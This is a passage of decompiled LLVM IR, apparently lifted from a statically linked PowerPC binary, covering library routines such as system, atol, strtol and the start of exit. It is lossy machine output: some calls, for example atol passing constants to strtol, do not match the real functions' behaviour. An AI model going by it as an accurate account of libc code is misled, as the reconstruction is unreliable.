  %v4_1001f994 = load i32, i32* %v3_1001f994, align 4
  store i32 %v4_1001f994, i32* %r0.global-to-local, align 4
  %v1_1001f998 = add i32 %v2_1001f990, 20
  %v2_1001f998 = inttoptr i32 %v1_1001f998 to i32*
  %v3_1001f998 = load i32, i32* %v2_1001f998, align 4
  store i32 %v3_1001f998, i32* %r9.global-to-local, align 4
  %v0_1001f99c = load i32, i32* %r29.global-to-local, align 4
  %v1_1001f99c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f99c = add i32 %v1_1001f99c, 8
  %v3_1001f99c = inttoptr i32 %v2_1001f99c to i32*
  store i32 %v0_1001f99c, i32* %v3_1001f99c, align 4
  %v0_1001f9a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001f9a0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f9a0 = add i32 %v1_1001f9a0, 20
  %v3_1001f9a0 = inttoptr i32 %v2_1001f9a0 to i32*
  store i32 %v0_1001f9a0, i32* %v3_1001f9a0, align 4
  %v0_1001f9a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001f9a4 = mul i32 %v0_1001f9a4, 4
  store i32 %v1_1001f9a4, i32* %r0.global-to-local, align 4
  %v1_1001f9a8 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f9a8 = add i32 %v1_1001f9a8, 16
  %v3_1001f9a8 = inttoptr i32 %v2_1001f9a8 to i32*
  store i32 %v0_1001f9a4, i32* %v3_1001f9a8, align 4
  %v0_1001f9ac = load i32, i32* %r29.global-to-local, align 4
  %v1_1001f9ac = load i32, i32* %r0.global-to-local, align 4
  %v2_1001f9ac = add i32 %v1_1001f9ac, %v0_1001f9ac
  store i32 %v2_1001f9ac, i32* %r0.global-to-local, align 4
  %v1_1001f9b0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f9b0 = add i32 %v1_1001f9b0, 24
  %v3_1001f9b0 = inttoptr i32 %v2_1001f9b0 to i32*
  store i32 %v2_1001f9ac, i32* %v3_1001f9b0, align 4
  store i32 ptrtoint (i32* @global_var_1001f9b8.1249 to i32), i32* @lr, align 4
  %v0_1001f9b4 = call i32 @srandom_r()
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001f9bc = load i32, i32* @r31, align 4
  %v3_1001f9bc = icmp eq i32 %v0_1001f9bc, 0
  %v1_1001f9c0 = load i32, i32* %r27.global-to-local, align 4
  %v2_1001f9c0 = inttoptr i32 %v1_1001f9c0 to i32*
  store i32 0, i32* %v2_1001f9c0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001f9bc, label %dec_label_pc_1001f9fc, label %dec_label_pc_1001f9cc

dec_label_pc_1001f9cc:                            ; preds = %dec_label_pc_1001f988
  %v0_1001f9cc = load i32, i32* @r30, align 4
  %v1_1001f9cc = add i32 %v0_1001f9cc, 4
  %v2_1001f9cc = inttoptr i32 %v1_1001f9cc to i32*
  %v3_1001f9cc = load i32, i32* %v2_1001f9cc, align 4
  %v0_1001f9d0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001f9d0 = sub i32 %v3_1001f9cc, %v0_1001f9d0
  %v4_1001f9d4 = sdiv i32 %v2_1001f9d0, 4
  %v1_1001f9d8 = mul i32 %v4_1001f9d4, 5
  %v1_1001f9dc = load i32, i32* @r31, align 4
  %v2_1001f9dc = add i32 %v1_1001f9d8, %v1_1001f9dc
  store i32 %v2_1001f9dc, i32* %r0.global-to-local, align 4
  %v1_1001f9e0 = load i32, i32* %r27.global-to-local, align 4
  %v2_1001f9e0 = inttoptr i32 %v1_1001f9e0 to i32*
  store i32 %v2_1001f9dc, i32* %v2_1001f9e0, align 4
  %v0_1001fa0c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f9fc

dec_label_pc_1001f9e8:                            ; preds = %dec_label_pc_1001f97c
  %v0_1001f9e8 = call i32 @__errno_location()
  store i32 %v0_1001f9e8, i32* %r3.global-to-local, align 4
  %v0_1001f9ec = load i32, i32* %r28.global-to-local, align 4
  %v2_1001f9ec = inttoptr i32 %v0_1001f9e8 to i32*
  store i32 %v0_1001f9ec, i32* %v2_1001f9ec, align 4
  %v0_1001f9f0 = call i32 @__errno_location()
  %v0_1001f9f4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1001f9f4 = inttoptr i32 %v0_1001f9f0 to i32*
  store i32 %v0_1001f9f4, i32* %v2_1001f9f4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f9fc

dec_label_pc_1001f9fc:                            ; preds = %dec_label_pc_1001f988, %dec_label_pc_1001f9cc, %dec_label_pc_1001f9e8
  %v0_1001fa0c = phi i32 [ 0, %dec_label_pc_1001f988 ], [ %v0_1001fa0c.pre, %dec_label_pc_1001f9cc ], [ -1, %dec_label_pc_1001f9e8 ]
  store i32 %v0_1001f92c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001fa0c

; uselistorder directives
  uselistorder i32 %v0_1001f9a4, { 1, 0 }
  uselistorder i32 %v2_1001f990, { 1, 0, 2 }
  uselistorder i32 %v0_1001f988, { 1, 0 }
  uselistorder i32 %v2_1001f948, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002f0c4.1247 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 5, 0, 3, 4 }
  uselistorder label %dec_label_pc_1001f9fc, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_1001fa1c = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1001fa20 = load i32, i32* @r31, align 4
  br i1 %v3_1001fa1c, label %dec_label_pc_1001fb50, label %dec_label_pc_1001fa30

dec_label_pc_1001fa30:                            ; preds = %entry
  store i32 268565052, i32* @lr, align 4
  %v2_1001fa38 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268565068, i32* @lr, align 4
  %v2_1001fa48 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268565084, i32* @lr, align 4
  %v2_1001fa58 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1001fa58, i32* @r3, align 4
  store i32 268565092, i32* @lr, align 4
  %v1_1001fa60 = call i32 @__vfork(i32 %v2_1001fa58)
  store i32 %v1_1001fa60, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v1_1001fa60, -1
  br i1 %tmp10, label %dec_label_pc_1001fa98, label %dec_label_pc_1001fa6c

dec_label_pc_1001fa6c:                            ; preds = %dec_label_pc_1001fa30
  store i32 268565112, i32* @lr, align 4
  %v2_1001fa74 = call i32 @__bsd_signal(i32 3, i32 %v2_1001fa38)
  store i32 268565124, i32* @lr, align 4
  %v2_1001fa80 = call i32 @__bsd_signal(i32 2, i32 %v2_1001fa48)
  store i32 268565136, i32* @lr, align 4
  %v2_1001fa8c = call i32 @__bsd_signal(i32 17, i32 %v2_1001fa58)
  br label %dec_label_pc_1001fb50

dec_label_pc_1001fa98:                            ; preds = %dec_label_pc_1001fa30
  %v3_1001fa64 = icmp eq i32 %v1_1001fa60, 0
  br i1 %v3_1001fa64, label %dec_label_pc_1001fa9c, label %dec_label_pc_1001faf0

dec_label_pc_1001fa9c:                            ; preds = %dec_label_pc_1001fa98
  store i32 268565160, i32* @lr, align 4
  %v2_1001faa4 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268565172, i32* @lr, align 4
  %v2_1001fab0 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268565184, i32* @lr, align 4
  %v2_1001fabc = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_1001fae4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1002e3cc.1146 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3d4.1147 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3d8.1148 to i32), i32 %arg1, i32 0)
  %v1_1001faec = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1001faf0

dec_label_pc_1001faf0:                            ; preds = %dec_label_pc_1001fa98, %dec_label_pc_1001fa9c
  store i32 268565244, i32* @lr, align 4
  %v2_1001faf8 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268565256, i32* @lr, align 4
  %v2_1001fb04 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_1001fb08 = load i32, i32* @r31, align 4
  %v2_1001fb0c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268565276, i32* @lr, align 4
  %v4_1001fb18 = call i32 @wait4(i32 %v0_1001fb08, i32 %v2_1001fb0c, i32 0, i32 0)
  %v3_1001fb1c = icmp eq i32 %v4_1001fb18, -1
  br i1 %v3_1001fb1c, label %dec_label_pc_1001fb24, label %dec_label_pc_1001fb28

dec_label_pc_1001fb24:                            ; preds = %dec_label_pc_1001faf0
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1001fb28

dec_label_pc_1001fb28:                            ; preds = %dec_label_pc_1001faf0, %dec_label_pc_1001fb24
  store i32 268565300, i32* @lr, align 4
  %v2_1001fb30 = call i32 @__bsd_signal(i32 3, i32 %v2_1001fa38)
  store i32 268565312, i32* @lr, align 4
  %v2_1001fb3c = call i32 @__bsd_signal(i32 2, i32 %v2_1001fa48)
  store i32 268565324, i32* @lr, align 4
  %v2_1001fb48 = call i32 @__bsd_signal(i32 17, i32 %v2_1001fa58)
  %v3_1001fb4c = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1001fb50

dec_label_pc_1001fb50:                            ; preds = %entry, %dec_label_pc_1001fa6c, %dec_label_pc_1001fb28
  %v0_1001fb60 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_1001fa6c ], [ %v3_1001fb4c, %dec_label_pc_1001fb28 ]
  store i32 %v0_1001fa20, i32* @r31, align 4
  ret i32 %v0_1001fb60

; uselistorder directives
  uselistorder i32 %v1_1001fa60, { 1, 0, 2 }
  uselistorder i32 %v2_1001fa58, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001fa48, { 1, 0 }
  uselistorder i32 %v2_1001fa38, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_1001fb50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001fb28, { 1, 0 }
  uselistorder label %dec_label_pc_1001faf0, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1001fb6c = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1001fb6c
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1001fb74 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1001fb74
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 0, i32* @r6, align 4
  %v2_1001fb7c = call i32 @_stdlib_strto_l(i8* null)
  ret i32 %v2_1001fb7c
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001fb90 = load i32, i32* @r4, align 4
  store i32 %v0_1001fb90, i32* @r25, align 4
  %v0_1001fb98 = load i32, i32* @r5, align 4
  store i32 %v0_1001fb98, i32* @r30, align 4
  %v0_1001fb9c = load i32, i32* @r6, align 4
  store i32 %v0_1001fb9c, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1001fba4 = load i32, i32* @global_var_1004513c, align 4
  br label %dec_label_pc_1001fbb0

dec_label_pc_1001fbac:                            ; preds = %dec_label_pc_1001fbb0
  %v1_1001fbac = add i32 %v0_1001fbe4, 1
  store i32 %v1_1001fbac, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fbb0

dec_label_pc_1001fbb0:                            ; preds = %entry, %dec_label_pc_1001fbac
  %v0_1001fbe4 = phi i32 [ %tmp, %entry ], [ %v1_1001fbac, %dec_label_pc_1001fbac ]
  %v1_1001fbb0 = inttoptr i32 %v0_1001fbe4 to i8*
  %v2_1001fbb0 = load i8, i8* %v1_1001fbb0, align 1
  %v3_1001fbb0 = zext i8 %v2_1001fbb0 to i32
  %v1_1001fbb4 = mul nuw nsw i32 %v3_1001fbb0, 2
  %v2_1001fbb8 = add i32 %v1_1001fbb4, %v3_1001fba4
  %v3_1001fbb8 = inttoptr i32 %v2_1001fbb8 to i16*
  %v4_1001fbb8 = load i16, i16* %v3_1001fbb8, align 2
  %v1_1001fbbc = and i16 %v4_1001fbb8, 32
  %v3_1001fbbc = icmp eq i16 %v1_1001fbbc, 0
  br i1 %v3_1001fbbc, label %dec_label_pc_1001fbc4, label %dec_label_pc_1001fbac

dec_label_pc_1001fbc4:                            ; preds = %dec_label_pc_1001fbb0
  %v3_1001fbc4 = icmp eq i8 %v2_1001fbb0, 43
  br i1 %v3_1001fbc4, label %dec_label_pc_1001fbe4, label %dec_label_pc_1001fbcc

dec_label_pc_1001fbcc:                            ; preds = %dec_label_pc_1001fbc4
  %v3_1001fbcc = icmp eq i8 %v2_1001fbb0, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1001fbcc, label %dec_label_pc_1001fbe4, label %dec_label_pc_1001fbe8

dec_label_pc_1001fbe4:                            ; preds = %dec_label_pc_1001fbc4, %dec_label_pc_1001fbcc
  %storemerge = phi i32 [ 1, %dec_label_pc_1001fbcc ], [ 0, %dec_label_pc_1001fbc4 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1001fbe4 = add i32 %v0_1001fbe4, 1
  store i32 %v1_1001fbe4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fbe8

dec_label_pc_1001fbe8:                            ; preds = %dec_label_pc_1001fbcc, %dec_label_pc_1001fbe4
  %v1_1001fbe8 = call i32 @__asm_rlwinm.(i32 %v0_1001fb98, i32 0, i32 28, i32 26)
  %v4_1001fbe8 = icmp eq i32 %v1_1001fbe8, 0
  store i32 %tmp, i32* @r11, align 4
  br i1 %v4_1001fbe8, label %dec_label_pc_1001fbf4, label %dec_label_pc_1001fbe8.dec_label_pc_1001fc30_crit_edge

dec_label_pc_1001fbe8.dec_label_pc_1001fc30_crit_edge: ; preds = %dec_label_pc_1001fbe8
  %v0_1001fc30.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001fc30

dec_label_pc_1001fbf4:                            ; preds = %dec_label_pc_1001fbe8
  %v0_1001fbf4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1001fbf4 = inttoptr i32 %v0_1001fbf4 to i8*
  %v2_1001fbf4 = load i8, i8* %v1_1001fbf4, align 1
  %v0_1001fbf8 = load i32, i32* @r30, align 4
  %v1_1001fbf8 = add i32 %v0_1001fbf8, 10
  store i32 %v1_1001fbf8, i32* @r30, align 4
  %v3_1001fbfc = icmp eq i8 %v2_1001fbf4, 48
  br i1 %v3_1001fbfc, label %dec_label_pc_1001fc04, label %dec_label_pc_1001fc24

dec_label_pc_1001fc04:                            ; preds = %dec_label_pc_1001fbf4
  %v1_1001fc04 = add i32 %v0_1001fbf4, 1
  %v2_1001fc04 = inttoptr i32 %v1_1001fc04 to i8*
  %v3_1001fc04 = load i8, i8* %v2_1001fc04, align 1
  %v4_1001fc04 = zext i8 %v3_1001fc04 to i32
  store i32 %v1_1001fc04, i32* %r31.global-to-local, align 4
  %v1_1001fc08 = add i32 %v0_1001fbf8, 8
  store i32 %v1_1001fc08, i32* @r30, align 4
  %v1_1001fc0c = or i32 %v4_1001fc04, 32
  store i32 %v1_1001fc04, i32* @r11, align 4
  %v3_1001fc14 = icmp eq i32 %v1_1001fc0c, 120
  br i1 %v3_1001fc14, label %dec_label_pc_1001fc1c, label %dec_label_pc_1001fc24

dec_label_pc_1001fc1c:                            ; preds = %dec_label_pc_1001fc04
  %v1_1001fc1c = mul i32 %v1_1001fc08, 2
  store i32 %v1_1001fc1c, i32* @r30, align 4
  %v1_1001fc20 = add i32 %v0_1001fbf4, 2
  store i32 %v1_1001fc20, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fc24

dec_label_pc_1001fc24:                            ; preds = %dec_label_pc_1001fc04, %dec_label_pc_1001fbf4, %dec_label_pc_1001fc1c
  %v0_1001fcd815 = phi i32 [ %v1_1001fc04, %dec_label_pc_1001fc1c ], [ %tmp, %dec_label_pc_1001fbf4 ], [ %v1_1001fc04, %dec_label_pc_1001fc04 ]
  %v0_1001fc24 = phi i32 [ %v1_1001fc1c, %dec_label_pc_1001fc1c ], [ %v1_1001fbf8, %dec_label_pc_1001fbf4 ], [ %v1_1001fc08, %dec_label_pc_1001fc04 ]
  %tmp22 = icmp slt i32 %v0_1001fc24, 17
  br i1 %tmp22, label %dec_label_pc_1001fc30, label %dec_label_pc_1001fc2c

dec_label_pc_1001fc2c:                            ; preds = %dec_label_pc_1001fc24
  store i32 16, i32* @r30, align 4
  br label %dec_label_pc_1001fc30

dec_label_pc_1001fc30:                            ; preds = %dec_label_pc_1001fbe8.dec_label_pc_1001fc30_crit_edge, %dec_label_pc_1001fc24, %dec_label_pc_1001fc2c
  %v0_1001fcd814 = phi i32 [ %tmp, %dec_label_pc_1001fbe8.dec_label_pc_1001fc30_crit_edge ], [ %v0_1001fcd815, %dec_label_pc_1001fc24 ], [ %v0_1001fcd815, %dec_label_pc_1001fc2c ]
  %v1_1001fc44 = phi i32 [ %v0_1001fc30.pre, %dec_label_pc_1001fbe8.dec_label_pc_1001fc30_crit_edge ], [ %v0_1001fc24, %dec_label_pc_1001fc24 ], [ 16, %dec_label_pc_1001fc2c ]
  %v1_1001fc30 = add i32 %v1_1001fc44, -2
  store i32 0, i32* @r10, align 4
  %v2_1001fc38 = icmp ugt i32 %v1_1001fc30, 34
  br i1 %v2_1001fc38, label %dec_label_pc_1001fcd0, label %dec_label_pc_1001fc40

dec_label_pc_1001fc40:                            ; preds = %dec_label_pc_1001fc30
  %v2_1001fc44 = udiv i32 -1, %v1_1001fc44
  store i32 %v2_1001fc44, i32* @r29, align 4
  %v2_1001fc48 = mul i32 %v2_1001fc44, %v1_1001fc44
  %v1_1001fc4c = sub i32 -1, %v2_1001fc48
  %v1_1001fc50 = urem i32 %v1_1001fc4c, 256
  store i32 %v1_1001fc50, i32* @r27, align 4
  %v0_1001fc5c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fc5c

dec_label_pc_1001fc58:                            ; preds = %dec_label_pc_1001fcc8, %dec_label_pc_1001fcb0
  %v1_1001fc60.pre = phi i32 [ %v1_1001fc64, %dec_label_pc_1001fcc8 ], [ %v1_1001fc60.pre.pre, %dec_label_pc_1001fcb0 ]
  %v0_1001fc60.pre = phi i32 [ %v2_1001fcc8, %dec_label_pc_1001fcc8 ], [ %v0_1001fc60.pre.pre, %dec_label_pc_1001fcb0 ]
  %v0_1001fc58 = phi i32 [ %v1_1001fc94, %dec_label_pc_1001fcc8 ], [ %v0_1001fc58.pre, %dec_label_pc_1001fcb0 ]
  store i32 %v0_1001fc58, i32* @r11, align 4
  br label %dec_label_pc_1001fc5c

dec_label_pc_1001fc5c:                            ; preds = %dec_label_pc_1001fc40, %dec_label_pc_1001fc58
  %v0_1001fcd812 = phi i32 [ %v0_1001fcd814, %dec_label_pc_1001fc40 ], [ %v0_1001fc58, %dec_label_pc_1001fc58 ]
  %v0_1001fc94 = phi i32 [ %v0_1001fc5c.pre, %dec_label_pc_1001fc40 ], [ %v0_1001fc58, %dec_label_pc_1001fc58 ]
  %v1_1001fc64 = phi i32 [ %v2_1001fc44, %dec_label_pc_1001fc40 ], [ %v1_1001fc60.pre, %dec_label_pc_1001fc58 ]
  %v0_1001fca0 = phi i32 [ 0, %dec_label_pc_1001fc40 ], [ %v0_1001fc60.pre, %dec_label_pc_1001fc58 ]
  %v1_1001fc5c = inttoptr i32 %v0_1001fc94 to i8*
  %v2_1001fc5c = load i8, i8* %v1_1001fc5c, align 1
  %v3_1001fc5c = zext i8 %v2_1001fc5c to i32
  %v3_1001fc60 = icmp ugt i32 %v0_1001fca0, %v1_1001fc64
  %v1_1001fc68 = add nuw nsw i32 %v3_1001fc5c, 208
  %v1_1001fc6c = or i32 %v3_1001fc5c, 32
  %v1_1001fc70 = urem i32 %v1_1001fc68, 256
  %tmp23 = icmp ult i32 %v1_1001fc70, 10
  br i1 %tmp23, label %dec_label_pc_1001fc90, label %dec_label_pc_1001fc80

dec_label_pc_1001fc80:                            ; preds = %dec_label_pc_1001fc5c
  %tmp24 = icmp ult i32 %v1_1001fc6c, 97
  br i1 %tmp24, label %dec_label_pc_1001fc90, label %dec_label_pc_1001fc8c

dec_label_pc_1001fc8c:                            ; preds = %dec_label_pc_1001fc80
  %v1_1001fc80 = add nsw i32 %v1_1001fc6c, -87
  %v1_1001fc8c = urem i32 %v1_1001fc80, 256
  br label %dec_label_pc_1001fc90

dec_label_pc_1001fc90:                            ; preds = %dec_label_pc_1001fc80, %dec_label_pc_1001fc5c, %dec_label_pc_1001fc8c
  %v1_1001fcc8 = phi i32 [ 40, %dec_label_pc_1001fc80 ], [ %v1_1001fc70, %dec_label_pc_1001fc5c ], [ %v1_1001fc8c, %dec_label_pc_1001fc8c ]
  %v1_1001fc90 = load i32, i32* @r30, align 4
  %v2_1001fc90 = icmp slt i32 %v1_1001fcc8, %v1_1001fc90
  %v1_1001fc94 = add i32 %v0_1001fc94, 1
  store i32 %v1_1001fc94, i32* %r31.global-to-local, align 4
  br i1 %v2_1001fc90, label %dec_label_pc_1001fc9c, label %dec_label_pc_1001fcd0

dec_label_pc_1001fc9c:                            ; preds = %dec_label_pc_1001fc90
  br i1 %v3_1001fc60, label %dec_label_pc_1001fcb0, label %dec_label_pc_1001fca0

dec_label_pc_1001fca0:                            ; preds = %dec_label_pc_1001fc9c
  %v1_1001fca4 = load i32, i32* @r27, align 4
  %v0_1001fca8.not = icmp ne i32 %v0_1001fca0, %v1_1001fc64
  %tmp25 = icmp ule i32 %v1_1001fcc8, %v1_1001fca4
  %or.cond = or i1 %tmp25, %v0_1001fca8.not
  br i1 %or.cond, label %dec_label_pc_1001fcc8, label %dec_label_pc_1001fcb0

dec_label_pc_1001fcb0:                            ; preds = %dec_label_pc_1001fca0, %dec_label_pc_1001fc9c
  %v0_1001fcb0 = call i32 @__errno_location()
  %v0_1001fcb4 = load i32, i32* @r28, align 4
  %v1_1001fcb4 = load i32, i32* @r26, align 4
  %v2_1001fcb4 = and i32 %v1_1001fcb4, %v0_1001fcb4
  store i32 %v2_1001fcb4, i32* @r28, align 4
  store i32 -1, i32* @r10, align 4
  %v2_1001fcc0 = inttoptr i32 %v0_1001fcb0 to i32*
  store i32 34, i32* %v2_1001fcc0, align 4
  %v0_1001fc58.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1001fc60.pre.pre = load i32, i32* @r10, align 4
  %v1_1001fc60.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001fc58

dec_label_pc_1001fcc8:                            ; preds = %dec_label_pc_1001fca0
  %v2_1001fca0 = mul i32 %v1_1001fc90, %v0_1001fca0
  %v2_1001fcc8 = add i32 %v2_1001fca0, %v1_1001fcc8
  store i32 %v2_1001fcc8, i32* @r10, align 4
  br label %dec_label_pc_1001fc58

dec_label_pc_1001fcd0:                            ; preds = %dec_label_pc_1001fc90, %dec_label_pc_1001fc30
  %v0_1001fcd8 = phi i32 [ %v0_1001fcd814, %dec_label_pc_1001fc30 ], [ %v0_1001fcd812, %dec_label_pc_1001fc90 ]
  %v0_1001fcd0 = load i32, i32* @r25, align 4
  %v3_1001fcd0 = icmp eq i32 %v0_1001fcd0, 0
  br i1 %v3_1001fcd0, label %dec_label_pc_1001fcdc, label %dec_label_pc_1001fcd8

dec_label_pc_1001fcd8:                            ; preds = %dec_label_pc_1001fcd0
  %v2_1001fcd8 = inttoptr i32 %v0_1001fcd0 to i32*
  store i32 %v0_1001fcd8, i32* %v2_1001fcd8, align 4
  br label %dec_label_pc_1001fcdc

dec_label_pc_1001fcdc:                            ; preds = %dec_label_pc_1001fcd0, %dec_label_pc_1001fcd8
  %v0_1001fcdc = load i32, i32* @r28, align 4
  %v1_1001fcdc = sub i32 0, %v0_1001fcdc
  %v0_1001fce4 = load i32, i32* @r26, align 4
  %v3_1001fce4 = icmp eq i32 %v0_1001fce4, 0
  %tmp27 = lshr i32 %v1_1001fcdc, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1001fd20.pre.pre = load i32, i32* @r10, align 4
  br i1 %v3_1001fce4, label %dec_label_pc_1001fd10, label %dec_label_pc_1001fcf8

dec_label_pc_1001fcf8:                            ; preds = %dec_label_pc_1001fcdc
  %v3_1001fcf8 = icmp ugt i32 %v0_1001fd20.pre.pre, %tmp28
  br i1 %v3_1001fcf8, label %dec_label_pc_1001fd00, label %dec_label_pc_1001fd10

dec_label_pc_1001fd00:                            ; preds = %dec_label_pc_1001fcf8
  %v0_1001fd00 = call i32 @__errno_location()
  %v2_1001fd08 = inttoptr i32 %v0_1001fd00 to i32*
  store i32 34, i32* %v2_1001fd08, align 4
  %v0_1001fd0c = load i32, i32* @r31, align 4
  store i32 %v0_1001fd0c, i32* @r10, align 4
  %v0_1001fd10.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001fd10

dec_label_pc_1001fd10:                            ; preds = %dec_label_pc_1001fcdc, %dec_label_pc_1001fcf8, %dec_label_pc_1001fd00
  %v0_1001fd20.pre = phi i32 [ %v0_1001fd20.pre.pre, %dec_label_pc_1001fcf8 ], [ %v0_1001fd0c, %dec_label_pc_1001fd00 ], [ %v0_1001fd20.pre.pre, %dec_label_pc_1001fcdc ]
  %v0_1001fd10 = phi i32 [ %v0_1001fcdc, %dec_label_pc_1001fcf8 ], [ %v0_1001fd10.pre, %dec_label_pc_1001fd00 ], [ %v0_1001fcdc, %dec_label_pc_1001fcdc ]
  %v3_1001fd10 = icmp eq i32 %v0_1001fd10, 0
  br i1 %v3_1001fd10, label %dec_label_pc_1001fd1c, label %dec_label_pc_1001fd18

dec_label_pc_1001fd18:                            ; preds = %dec_label_pc_1001fd10
  %v1_1001fd18 = sub i32 0, %v0_1001fd20.pre
  store i32 %v1_1001fd18, i32* @r10, align 4
  br label %dec_label_pc_1001fd1c

dec_label_pc_1001fd1c:                            ; preds = %dec_label_pc_1001fd10, %dec_label_pc_1001fd18
  %v0_1001fd20 = phi i32 [ %v1_1001fd18, %dec_label_pc_1001fd18 ], [ %v0_1001fd20.pre, %dec_label_pc_1001fd10 ]
  ret i32 %v0_1001fd20

; uselistorder directives
  uselistorder i32 %v0_1001fd20.pre, { 1, 0 }
  uselistorder i32 %v0_1001fd20.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1001fcc8, { 1, 0 }
  uselistorder i32 %v1_1001fc94, { 1, 0 }
  uselistorder i32 %v1_1001fc70, { 1, 0 }
  uselistorder i32 %v1_1001fc6c, { 1, 0 }
  uselistorder i32 %v3_1001fc5c, { 1, 0 }
  uselistorder i32 %v0_1001fca0, { 1, 0, 2 }
  uselistorder i32 %v1_1001fc64, { 0, 2, 1 }
  uselistorder i32 %v0_1001fc58, { 2, 0, 1 }
  uselistorder i32 %v2_1001fc44, { 1, 0, 2 }
  uselistorder i32 %v1_1001fc1c, { 1, 0 }
  uselistorder i32 %v1_1001fc08, { 1, 0, 2 }
  uselistorder i32 %v0_1001fbe4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32 2147483647, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001fd1c, { 1, 0 }
  uselistorder label %dec_label_pc_1001fd10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001fcdc, { 1, 0 }
  uselistorder label %dec_label_pc_1001fc90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001fc5c, { 1, 0 }
  uselistorder label %dec_label_pc_1001fc30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001fc24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001fbe8, { 1, 0 }
  uselistorder label %dec_label_pc_1001fbe4, { 1, 0 }
  uselistorder label %dec_label_pc_1001fbb0, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001fd50 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001fd64 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_1004501c.1252 to i32))
  store i32 268565872, i32* @lr, align 4
  %v1_1001fd6c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004501c.1252 to i32))
  %v3_1001fd74 = load i32, i32* @global_var_10045224.1253, align 4
  %v3_1001fd78 = icmp eq i32 %v3_1001fd74, 0
  br i1 %v3_1001fd78, label %dec_label_pc_1001fd8c, label %dec_label_pc_1001fd80

dec_label_pc_1001fd80:                            ; preds = %entry
  %v1_1001fd88 = call i32 @unknown_0()
  br label %dec_label_pc_1001fd8c

